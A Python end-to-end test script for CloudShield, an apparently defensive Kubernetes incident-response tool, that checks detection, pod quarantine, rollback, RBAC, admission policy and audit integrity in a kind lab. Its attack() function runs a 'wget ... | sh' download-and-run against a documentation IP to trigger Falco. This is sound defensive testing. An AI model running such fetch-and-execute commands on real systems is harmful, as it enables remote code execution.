"""Scenario S1 against CloudShield running inside a real Kubernetes cluster: the kind lab, end to end.

    make lab-up && make lab-e2e

Unlike scripts/demo.py, nothing on the Kubernetes side is simulated. CloudShield runs as a pod,
installed by its Helm chart, and this script talks to it through a port-forward. With `--alert falco`
(what CI runs) a download-and-run is executed inside a live checkout pod, Falco detects it, and
Falcosidekick posts the alert to the CloudShield Service; with the default `--alert fixture` the S1
Falco alert is re-addressed to the pod instead. CloudShield reads the cluster as the investigator
service account, quarantines as the responder, and tests traffic as the prober. A probe pod then
also proves with real traffic that the NetworkPolicies cut the quarantined pod off and that rollback
restores it. Only AWS is missing (kind has no EKS Pod Identity or EC2), so those fields stay unresolved.

Exits non-zero if any check fails, so CI can run it on every pull request.
"""

import argparse
import copy
import json
import os
import subprocess
import sys
import time
import uuid
from collections.abc import Callable, Iterator
from contextlib import contextmanager
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "services"))
sys.path.insert(0, str(ROOT / "scripts"))

import httpx  # noqa: E402
import yaml  # noqa: E402
from kubernetes import client, config  # noqa: E402
from kubernetes.client.exceptions import ApiException  # noqa: E402
from prometheus_client.parser import text_string_to_metric_families  # noqa: E402

from demo import Transcript, to_svg  # noqa: E402

FIXTURE = ROOT / "detections" / "fixtures" / "s1_suspicious_process" / "falco_alert.json"
LEAKY = (
    ROOT / "infra" / "policies" / "kyverno" / "tests" / "require-quarantine-exclusion" / "leaky-allow.yaml"
)
CLUSTER, NS, PROBE = "kind-cloudshield-lab", "shop", "probe"
IMAGE_NS = "cloudshield"
SERVICE, LOCAL_PORT = "cloudshield-core", 18080
SIGNED_IMAGE = "ghcr.io/aymen-nasri/cloudshield:main"
UNSIGNED_IMAGE = "busybox:1.37.0"
OTHER_SIGNER_IMAGE = "ghcr.io/sigstore/cosign/cosign:v2.4.1"  # keyless-signed, by Sigstore's workflow


def kubectl(*args: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(["kubectl", *args], capture_output=True, text=True, check=check)  # noqa: S603, S607


def as_service_account(name: str) -> client.ApiClient:
    """An API client that authenticates as cloudshield/<name>, not as the cluster admin."""
    token = kubectl("-n", "cloudshield", "create", "token", name, "--duration=1h").stdout.strip()
    cfg = client.Configuration()
    config.load_kube_config(client_configuration=cfg)
    cfg.cert_file = cfg.key_file = None  # drop the admin client certificate
    cfg.api_key = {"authorization": f"Bearer {token}"}
    return client.ApiClient(cfg)


def reachable(ip: str, *, expect: bool = True) -> bool:
    """Can the probe pod (labelled like cart) open a new connection to this pod on 8080?

    Calico applies a label change within seconds, so retry briefly until the expected answer shows.
    """
    for attempt in range(5):
        r = kubectl("-n", NS, "exec", PROBE, "--", "curl", "-s", "-m", "3", f"http://{ip}:8080/", check=False)
        ok = r.returncode == 0 and "checkout ok" in r.stdout
        if ok is expect or attempt == 4:
            return ok
        time.sleep(2)
    return False


def may_exec(account: str, pod: str) -> bool:
    """Would the API server let this service account exec into this pod? (SubjectAccessReview)"""
    review = client.AuthorizationV1Api().create_subject_access_review(
        {
            "apiVersion": "authorization.k8s.io/v1",
            "kind": "SubjectAccessReview",
            "spec": {
                "user": f"system:serviceaccount:cloudshield:{account}",
                "resourceAttributes": {
                    "namespace": NS, "verb": "create", "resource": "pods", "subresource": "exec", "name": pod,
                },
            },
        }
    )  # fmt: skip
    return bool(review.status.allowed)


def forbidden(call: Callable[[], Any]) -> bool:
    try:
        call()
    except ApiException as exc:
        return exc.status == 403
    return False


def falco_alert_for(pod: Any) -> bytes:
    """The S1 fixture, re-addressed to a live pod, as Falcosidekick would deliver it."""
    alert = json.loads(FIXTURE.read_text(encoding="utf-8"))
    old = alert["output_fields"]["k8s.pod.name"]
    alert["uuid"] = str(uuid.uuid4())
    alert["time"] = datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    alert["hostname"] = pod.spec.node_name
    alert["output"] = alert["output"].replace(old, pod.metadata.name)
    alert["output_fields"]["k8s.pod.name"] = pod.metadata.name
    alert["output_fields"]["k8s.pod.uid"] = pod.metadata.uid
    return json.dumps(alert).encode()


def attack(pod: str) -> None:
    """The S1 behaviour for real: download-and-run inside the pod, from an ephemeral debug container.

    The checkout image has no shell, so the attacker's shell comes in a busybox container attached
    to the pod (Pod Security `restricted` still applies). The download goes to a documentation IP
    and is blocked by the namespace's default-deny egress, so nothing actually runs.
    """
    kubectl("-n", NS, "debug", f"pod/{pod}", "--image=busybox:1.37.0", "--profile=restricted",
            "--container=attacker", "--", "sh", "-c",
            "wget -T 2 -q -O- http://198.51.100.23/x.sh | sh")  # fmt: skip


def case_for(api: httpx.Client, pod_id: str, event_type: str, *, timeout: float) -> dict[str, Any] | None:
    """The case holding this kind of event for this pod, waiting for the alert to arrive if needed."""
    deadline = time.monotonic() + timeout
    while True:
        for case in api.get("/v1/cases").json():
            events = api.get(f"/v1/cases/{case['case_id']}").json()["events"]
            if any(e["resource_id"] == pod_id and e["event_type"] == event_type for e in events):
                return case
        if time.monotonic() > deadline:
            return None
        time.sleep(2)


def admission_check(net: Any) -> tuple[bool, bool]:
    """Ask the API server to admit two allow-policies (dry run): Kyverno must reject the leaky one.

    Retries briefly, because a just-applied Kyverno policy takes a moment to reach the webhook.
    """
    leaky = yaml.safe_load(LEAKY.read_text(encoding="utf-8"))
    leaky["metadata"]["name"] = "lab-leaky-allow"
    guarded = copy.deepcopy(leaky)
    guarded["metadata"]["name"] = "lab-guarded-allow"
    guarded["spec"]["podSelector"]["matchExpressions"] = [
        {"key": "cloudshield.io/quarantine", "operator": "NotIn", "values": ["true"]}
    ]
    rejected = False
    for _ in range(10):
        try:
            net.create_namespaced_network_policy(NS, leaky, dry_run="All")
        except ApiException as exc:
            rejected = exc.status in (400, 403) and "require-quarantine-exclusion" in (exc.body or "")
        if rejected:
            break
        time.sleep(3)
    try:
        net.create_namespaced_network_policy(NS, guarded, dry_run="All")
        admitted = True
    except ApiException:
        admitted = False
    return rejected, admitted


def admit_image(core: Any, image: str) -> tuple[bool, str]:
    """Would the API server admit a pod with this image in the cloudshield namespace? (dry run)"""
    pod = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"generateName": "lab-image-check-", "namespace": IMAGE_NS},
        "spec": {"containers": [{"name": "check", "image": image}]},
    }
    try:
        core.create_namespaced_pod(IMAGE_NS, pod, dry_run="All")
    except ApiException as exc:
        return False, exc.body or str(exc)
    return True, ""


def rejection_reason(body: str) -> str:
    """Kyverno's own words, from the API server's error body."""
    try:
        message = str(json.loads(body).get("message", body))
    except ValueError:
        message = body
    return " ".join(message.split())[-170:]


def image_checks(core: Any) -> list[tuple[str, str, bool, str]]:
    """Signed by this repo's workflow: admitted. Unsigned, or signed by someone else: rejected.

    A rejection only counts with the expected reason, so a network failure can't pass as one. Retries
    briefly, because a just-applied policy takes a moment to reach the webhook, and Kyverno calls
    the registry and Sigstore over the network.
    """
    cases = [
        ("this repo's signed image", SIGNED_IMAGE, ""),
        ("unsigned image", UNSIGNED_IMAGE, "no signatures found"),
        ("signed, but by someone else", OTHER_SIGNER_IMAGE, "subject mismatch"),
    ]
    results = []
    for label, image, expected_reason in cases:
        ok, reason = False, ""
        for attempt in range(10):
            if attempt:
                time.sleep(5)
            admitted, reason = admit_image(core, image)
            ok = admitted if not expected_reason else not admitted and expected_reason in reason
            if ok:
                break
        results.append((label, image, ok, reason))
    return results


def metric_values(api: httpx.Client) -> dict[tuple[str, tuple[tuple[str, str], ...]], float]:
    """Everything /metrics reports, keyed by sample name and labels."""
    response = api.get("/metrics")
    response.raise_for_status()
    return {
        (sample.name, tuple(sorted(sample.labels.items()))): sample.value
        for family in text_string_to_metric_families(response.text)
        for sample in family.samples
    }


@contextmanager
def deployed_api() -> Iterator[httpx.Client]:
    """The API as it runs in the cluster, through a port-forward to its Service."""
    forward = subprocess.Popen(  # noqa: S603
        ["kubectl", "-n", IMAGE_NS, "port-forward", f"svc/{SERVICE}", f"{LOCAL_PORT}:80"],  # noqa: S607
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    reader = {"authorization": "Bearer alice-lab"}  # calls below that act as someone else say so
    api = httpx.Client(base_url=f"http://127.0.0.1:{LOCAL_PORT}", headers=reader, timeout=30)
    try:
        for _ in range(30):
            try:
                api.get("/healthz").raise_for_status()
                break
            except httpx.HTTPError:
                time.sleep(1)
        yield api
    finally:
        api.close()
        forward.terminate()


def run(api: httpx.Client, alert: str, admission: bool) -> tuple[Transcript, list[str]]:
    out, failures = Transcript(), []
    config.load_kube_config()
    admin = client.CoreV1Api()
    investigator, responder = (
        as_service_account("cloudshield-investigator"),
        as_service_account("cloudshield-responder"),
    )

    def row(num: str, verb: str, what: str, result: str = "", ok: bool | None = None) -> None:
        style = {True: "good", False: "bad", None: ""}[ok]
        out.say(f"{num:<3}{verb:<9}{what:<50}{'-> ' + result if result else ''}".rstrip(), style)
        if ok is False:
            failures.append(f"{verb}: {what}")

    def note(text: str) -> None:
        out.say(" " * 12 + text, "dim")

    alice, bob = {"authorization": "Bearer alice-lab"}, {"authorization": "Bearer bob-lab"}

    title = "a live Falco detection" if alert == "falco" else "a replayed Falco alert"
    out.say(f"CloudShield · scenario S1 on a real Kubernetes cluster (kind), from {title}", "title")
    out.say(
        "CloudShield runs as a pod · real RBAC and NetworkPolicies · no AWS: IAM and EC2 stay unresolved",
        "dim",
    )
    out.say("")

    nodes = admin.list_node().items
    pods = sorted(
        (p for p in admin.list_namespaced_pod(NS, label_selector="app=checkout").items
         if p.status.phase == "Running"),
        key=lambda p: p.metadata.name,
    )  # fmt: skip
    target, other = pods[0], pods[1]
    row("1", "cluster", f"{len(nodes)} nodes, Calico, shop app with {len(pods)} checkout pods", "ready")
    core = admin.list_namespaced_pod(IMAGE_NS, label_selector=f"app.kubernetes.io/name={SERVICE}").items
    running = [p for p in core if p.status.phase == "Running"]
    deployed = len(running) == 1 and running[0].spec.service_account_name == "cloudshield-investigator"
    row(
        "",
        "deploy",
        "CloudShield pod, from its Helm chart",
        "running" if deployed else "NOT RUNNING",
        deployed,
    )
    if running:
        restarts = sum(c.restart_count for c in running[0].status.container_statuses or [])
        note(f"{running[0].metadata.name} as {running[0].spec.service_account_name}, {restarts} restarts")
    note(f"target {target.metadata.name} ({target.status.pod_ip}) on {target.spec.node_name}")
    before = reachable(target.status.pod_ip) and reachable(other.status.pod_ip)
    row("", "traffic", "probe -> both checkout pods on 8080", "reachable" if before else "BLOCKED", before)

    pod_id = f"k8s:pod/{NS}/{target.metadata.name}"
    if alert == "falco":
        attack(target.metadata.name)
        row("2", "attack", "wget ... | sh in a debug container of the pod", "launched")
        note("Falco (modern eBPF) -> Falcosidekick -> CloudShield Service, token-authenticated")
    else:
        r = api.post("/v1/ingest/falco", content=falco_alert_for(target),
                     headers={"authorization": "Bearer lab-falco-key"})  # fmt: skip
        row("2", "ingest", "S1 Falco alert, re-addressed to the target pod",
            f"{r.status_code} {r.json().get('status')}", r.status_code < 300)  # fmt: skip
    expected = "process.remote_script_execution" if alert == "falco" else "process.unexpected_execution"
    case = case_for(api, pod_id, expected, timeout=120 if alert == "falco" else 5)
    if case is None:
        row("3", "case", f"no case for {pod_id}", "TIMED OUT", False)
        return out, failures
    detail = api.get(f"/v1/cases/{case['case_id']}").json()
    rules = sorted({e["title"] for e in detail["events"]})
    row("3", "case", f"{case['event_count']} event(s), severity {case['severity']}", case["case_id"])
    for rule in rules:
        note(rule)

    graph = api.get(f"/v1/entities/{pod_id}/graph").json()
    ids = {e["entity_id"] for e in graph.get("entities", [])}
    traced = f"k8s:deployment/{NS}/checkout" in ids
    row("4", "enrich", "pod > deployment > service account > node", f"{len(ids)} entities", traced)
    note("read as cloudshield-investigator (read-only RBAC); IAM role and EC2: unresolved")

    body = {"action_type": "k8s.pod.quarantine_label", "rationale": "curl | sh in a protected workload",
            "target": {"kind": "Pod", "name": target.metadata.name, "uid": target.metadata.uid,
                       "namespace": NS}}  # fmt: skip
    p = api.post(f"/v1/cases/{case['case_id']}/proposals", json=body, headers=alice).json()
    row("5", "propose", "alice: quarantine the target pod", p["state"])
    p = api.post(f"/v1/proposals/{p['proposal_id']}/dry-run", headers=bob).json()
    lost = (p.get("impact_preview") or {}).get("allow_policies_lost") or []
    row("6", "gate", "dry run as the responder, then the policy gate", p["state"],
        "checkout-allow" in lost)  # fmt: skip
    note(f"impact: pod keeps running, loses {', '.join(lost)}")

    decision = {"justification": "confirmed remote script execution", "proposal_hash": p["proposal_hash"]}
    p = api.post(f"/v1/proposals/{p['proposal_id']}/approve", json=decision, headers=bob).json()
    row("7", "approve", "bob, incident responder", p["state"])
    x = api.post(f"/v1/proposals/{p['proposal_id']}/execute", headers=bob).json()
    row("8", "execute", "label the live pod as cloudshield-responder", x["state"], x["state"] == "verified")
    marks = {True: "ok", False: "FAILED", None: "skipped"}
    for name, passed in x["execution"]["checks"].items():
        note(f"{name:<30} {marks[passed]}")
    probed = x["execution"]["checks"].get("traffic_probe") is True
    row(
        "", "verify", "CloudShield's own probe saw the pod blocked", "yes" if probed else "NOT PROVEN", probed
    )

    cut = not reachable(target.status.pod_ip, expect=False)
    row("9", "traffic", "probe -> quarantined pod", "blocked" if cut else "STILL REACHABLE", cut)
    spared = reachable(other.status.pod_ip)
    row("", "traffic", "probe -> another checkout pod", "reachable" if spared else "BLOCKED", spared)
    phase = admin.read_namespaced_pod(target.metadata.name, NS).status.phase
    row("", "forensic", "quarantined pod still running", phase, phase == "Running")

    body = {**body, "action_type": "k8s.pod.remove_quarantine_label", "rationale": "rollback after review"}
    p = api.post(f"/v1/cases/{case['case_id']}/proposals", json=body, headers=alice).json()
    p = api.post(f"/v1/proposals/{p['proposal_id']}/dry-run", headers=bob).json()
    decision = {"justification": "evidence collected", "proposal_hash": p["proposal_hash"]}
    p = api.post(f"/v1/proposals/{p['proposal_id']}/approve", json=decision, headers=bob).json()
    x = api.post(f"/v1/proposals/{p['proposal_id']}/execute", headers=bob).json()
    released = x["state"] == "verified" and x["execution"]["checks"].get("traffic_probe") is True
    row("10", "rollback", "remove the label (proposed, approved, verified)", x["state"], released)
    back = reachable(target.status.pod_ip)
    row("", "traffic", "probe -> released pod", "reachable" if back else "BLOCKED", back)

    resp, inv = client.CoreV1Api(responder), client.CoreV1Api(investigator)
    patch = {"metadata": {"labels": {"x": "y"}}}
    checks = {
        "responder cannot delete the pod": forbidden(
            lambda: resp.delete_namespaced_pod(target.metadata.name, NS, dry_run="All")),
        "responder cannot read secrets": forbidden(lambda: resp.list_namespaced_secret(NS)),
        "responder cannot touch kube-system": forbidden(
            lambda: resp.patch_namespaced_pod("coredns", "kube-system", patch, dry_run="All")),
        "investigator cannot patch pods": forbidden(
            lambda: inv.patch_namespaced_pod(target.metadata.name, NS, patch, dry_run="All")),
        "investigator cannot read secrets": forbidden(lambda: inv.list_namespaced_secret(NS)),
        "prober cannot exec into the target": not may_exec("cloudshield-prober", target.metadata.name),
    }  # fmt: skip
    row("11", "rbac", "least privilege, checked against the API server",
        f"{sum(checks.values())}/{len(checks)} refused", all(checks.values()))  # fmt: skip
    for name, refused in checks.items():
        note(f"{name:<34} {'denied' if refused else 'ALLOWED'}")

    if admission:
        leaky, guarded = admission_check(client.NetworkingV1Api())
        row("12", "admit", "Kyverno: allow-policy missing the exclusion",
            "rejected" if leaky else "ADMITTED", leaky)  # fmt: skip
        row("", "admit", "the same policy with the exclusion", "admitted" if guarded else "REJECTED", guarded)
        note("a leaky allow-policy would let a quarantined pod keep its traffic")
        for label, image, ok, reason in image_checks(client.CoreV1Api()):
            want = "admitted" if image == SIGNED_IMAGE else "rejected"
            row("13" if image == SIGNED_IMAGE else "", "image", label, want if ok else f"NOT {want}", ok)
            note(image)
            if reason:
                note(f"kyverno: {rejection_reason(reason)}")

    audit = api.get("/v1/audit", params={"case_id": case["case_id"]}).json()
    intact = audit["chain_intact"]
    chain = "chain intact" if intact else "BROKEN"
    row("14" if admission else "12", "audit", f"{len(audit['records'])} hash-chained records", chain, intact)

    values = metric_values(api)
    quarantine, rollback = "k8s.pod.quarantine_label", "k8s.pod.remove_quarantine_label"
    verified = sum(
        values.get(
            ("cloudshield_response_executions_total", (("action_type", a), ("outcome", "verified"))), 0
        )
        for a in (quarantine, rollback)
    )
    probes = values.get(
        ("cloudshield_verification_checks_total", (("check", "traffic_probe"), ("result", "passed"))), 0
    )
    accepted = values.get(
        ("cloudshield_ingest_events_total", (("result", "accepted"), ("source", "falco"))), 0
    )
    lag = values.get(("cloudshield_ingest_lag_seconds_count", (("source", "falco"),)), 0)
    degraded = values.get(("cloudshield_source_degraded", (("source", "falco"),)))
    measured = (
        verified == 2
        and probes == 2
        and accepted >= case["event_count"]
        and lag == accepted
        and degraded == 0
    )
    row(
        "15",
        "metrics",
        "/metrics agrees with what just happened",
        "agrees" if measured else "DISAGREES",
        measured,
    )
    note(
        f"{accepted:.0f} alerts accepted, {verified:.0f} actions verified, {probes:.0f} traffic probes passed"
    )
    out.say("")
    verdict = f"{len(failures)} check(s) FAILED" if failures else "all checks passed"
    out.say(verdict, "bad" if failures else "good")
    return out, failures


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--svg", type=Path, help="also write the transcript as an SVG terminal image")
    parser.add_argument(
        "--alert",
        choices=["fixture", "falco"],
        default="fixture",
        help="replay the S1 alert, or attack the pod and wait for Falco's real alert",
    )
    parser.add_argument(
        "--admission",
        action="store_true",
        help="also check Kyverno's admission decisions (needs Kyverno installed)",
    )
    args = parser.parse_args()
    with deployed_api() as api:
        transcript, failures = run(api, args.alert, args.admission)
    text = "\n".join(t for _, t in transcript.lines)
    if summary := os.getenv("GITHUB_STEP_SUMMARY"):
        with open(summary, "a", encoding="utf-8") as f:
            f.write(f"### Kind lab: scenario S1 end to end\n\n```text\n{text}\n```\n")
    if args.svg:
        args.svg.parent.mkdir(parents=True, exist_ok=True)
        args.svg.write_text(to_svg(transcript, "python scripts/lab_e2e.py"), encoding="utf-8", newline="\n")
    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
